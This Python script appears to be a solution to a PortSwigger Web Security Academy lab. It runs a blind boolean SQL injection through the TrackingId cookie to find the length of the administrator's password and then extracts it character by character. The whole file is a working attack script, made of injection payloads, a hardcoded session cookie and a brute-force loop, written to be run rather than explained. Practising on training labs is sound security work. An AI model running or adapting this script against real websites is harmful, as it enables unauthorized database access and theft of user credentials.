import requests
import time

class SolveSqli:
    
    def __init__(self):
        self.passLenght = 0
        self.url = "https://0a070091049c817f82030bae008500ec.web-security-academy.net/filter?category=Food+%26+Drink"

    def runRequest(self, TrackingId="", check=""):
        resp = requests.get(self.url, cookies={"TrackingId":TrackingId, "session":"yCKfJh2vYWtSKtJGAuxwOkQNwm1wUxhK"})
        return check in resp.text

    def getPassLenght(self):
        for i in range(1,100):
            TrackingId=f"YqFv7Lkxe9icc0rm' and (select LENGTH(password)>={i} from users where username='administrator') --"
            resp = self.runRequest(TrackingId=TrackingId, check="Welcome back!")
            time.sleep(0.1)
            if resp == True:
                self.passLenght = i
            else:
                print(f"\nFound pass lenght is : {self.passLenght}")
                break

    def bruteForcePassword(self):
        password = ""
        charset = "abcdefghijklmnopqrstuvwxyz0123456789"
        for i in range(self.passLenght+1):
            for char in charset:
                TrackingId=f"YqFv7Lkxe9icc0rm' and (select SUBSTR(password, {i}, 1) from users where username='administrator' limit 1)='{char}"
                res = self.runRequest(TrackingId=TrackingId, check="Welcome back!")
                if res == True:
                    print(f"Found {i} - {char}")
                    password += char
                    break
            # if password == "":
            #     raise Exception('Some thing wrong with the script')
        print("PAssword Found : "+password if password!="" else "Password Not Found")





x = SolveSqli()
x.getPassLenght()
x.bruteForcePassword()